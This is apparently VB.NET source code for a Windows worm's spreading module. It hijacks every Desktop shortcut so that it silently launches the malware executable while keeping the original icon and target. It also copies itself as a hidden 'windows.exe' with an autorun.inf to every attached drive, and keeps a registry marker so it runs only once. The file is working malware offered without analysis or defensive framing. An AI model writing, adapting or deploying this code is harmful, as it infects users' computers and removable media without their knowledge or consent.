Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Reflection.Assembly
Imports System.IO.File
Imports System.IO.Path
Imports System.Diagnostics.Process
Imports Microsoft.Win32

Module spread


    Public Sub ShortcutInfection()
        On Error Resume Next
        If RegValueGet("Mr.Wolf") = "True" Then
            Exit Sub
        Else
            RegValueSet("Mr.Wolf", "True")
        End If
        Dim DeskTop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\"
        Dim file = IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
        Dim virustarget = Application.ExecutablePath.ToString
        For Each mw In file
            Dim lnk = IO.Path.GetExtension(mw)
            Dim name = IO.Path.GetFileNameWithoutExtension(mw)
            Dim lnkPath = IO.Path.GetFullPath(mw)
            If lnk = ".lnk" Then
                Dim namelnk = System.IO.Path.GetFileName(lnkPath)
                Dim WSH = CreateObject("WScript.****************l")
                Dim ExeLink = WSH.CreateShortcut(lnkPath)
                With CreateObject("WScript.****************l").CreateShortcut(DeskTop & namelnk)
                    .TargetPath = "cmd.exe"
                    .WorkingDirectory = ""
                    .Arguments = "/c start " & virustarget & "&explorer /root,""" & ExeLink.TargetPath.ToString & """ & exit"
                    .IconLocation = ExeLink.TargetPath.ToString
                    IO.File.Delete(lnkPath)
                    .Save()
                End With
            End If
        Next
    End Sub
    Public comp As Object = New Microsoft.VisualBasic.Devices.Computer
    Function RegValueGet(ByVal name As String) As String
        Try
            Return comp.Registry.CurrentUser.CreateSubKey("Software\" & "ShortCutInfection").GetValue(name, "")
        Catch ex As Exception
            Return "error < Not Found >"
        End Try
    End Function
    Function RegValueSet(ByVal name As String, ByVal values As String)
        Try
            comp.Registry.CurrentUser.CreateSubKey("Software\" & "ShortCutInfection").SetValue(name, values)
        Catch ex As Exception
        End Try
        Return Nothing
    End Function

    Public Sub SpreadFolder()
        Dim appProc() As Process
        Dim strModName, strProcName As String
        strModName = Process.GetCurrentProcess.MainModule.ModuleName
        strProcName = System.IO.Path.GetFileNameWithoutExtension(strModName)
        appProc = Process.GetProcessesByName(strProcName)
        If appProc.Length > 1 Then
            End
        End If
    End Sub

    Public Sub USB()
        Try
            Dim drivers As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
            Dim driver() As String = (IO.Directory.GetLogicalDrives)
            For Each drivers In driver
                If File.Exists(drivers & "windows.exe") = False Then
                    File.Copy(System.Reflection.Assembly.
  GetExecutingAssembly.Location, drivers & "windows.exe")
                End If
                Dim commande = New StreamWriter(drivers & "autorun.inf")
                commande.WriteLine("[autorun]")
                commande.WriteLine("open = windows.exe")
                commande.WriteLine("****************lexecute=windows.exe")
                commande.Close()
                File.SetAttributes(drivers & "autorun.inf", FileAttributes.Hidden)
                File.SetAttributes(drivers & "windows.exe", FileAttributes.Hidden)
            Next
        Catch ex As Exception
        End Try
    End Sub
End Module
